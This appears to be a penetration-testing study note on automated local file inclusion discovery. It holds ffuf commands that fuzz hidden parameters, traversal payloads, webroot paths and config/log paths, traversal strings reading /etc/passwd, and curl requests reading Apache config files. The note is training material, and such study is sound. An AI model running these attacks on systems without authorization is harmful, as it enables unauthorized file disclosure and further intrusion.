# Automated Scanning for LFI

While manual payload crafting is often necessary for bypassing WAFs or dealing with custom configurations, automated scanning can help quickly identify trivial LFI vulnerabilities.
### Parameter Fuzzing

Some parameters might be hidden (not in forms) and hence less secured.

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

> Once a valid parameter (like `language`) is found, test it for LFI using manual or automated methods.
### LFI Payload Wordlists

For quick testing of known payloads:

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

✔ Detects common payloads like:

- `../../etc/passwd`    
- `%2e%2e/%2e%2e/etc/passwd`
- `/etc/hosts`

> These must be manually verified post-scan to ensure the correct file was read.
### Fuzzing for Webroot Path

Used when relative path inclusion fails (e.g. for uploads).

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

✔ Common result: `/var/www/html/`
### Fuzzing for Configs and Logs
##### Wordlists - https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows ,  https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux , https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

To extract log file paths, webroot, and other useful info:

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

Examples of useful hits:

- `/etc/apache2/apache2.conf`    
- `/etc/apache2/envvars`
- `/etc/fstab`
- `/etc/hostname`
###  Manual Analysis of Config Files

After identifying config files like `apache2.conf`, inspect them:

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

Look for:

- `DocumentRoot` (webroot path)    
- `ErrorLog`, `CustomLog` (log file locations)

Then read referenced vars from:

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

> Find `APACHE_LOG_DIR`, `APACHE_RUN_USER`, etc.
### LFI Tools (Python-based)

- LFISuite - https://github.com/D35m0nd142/LFISuite     
- LFiFreak - https://github.com/OsandaMalith/LFiFreak    
- liffy - https://github.com/mzfr/liffy    

> Most are outdated, Python2-only, and not actively maintained, but good for quick scans on trivial cases.
# Tags
> #Web-Exploitation #LFI #RCE #Filters #Wrappers #Automation #File-Disclosure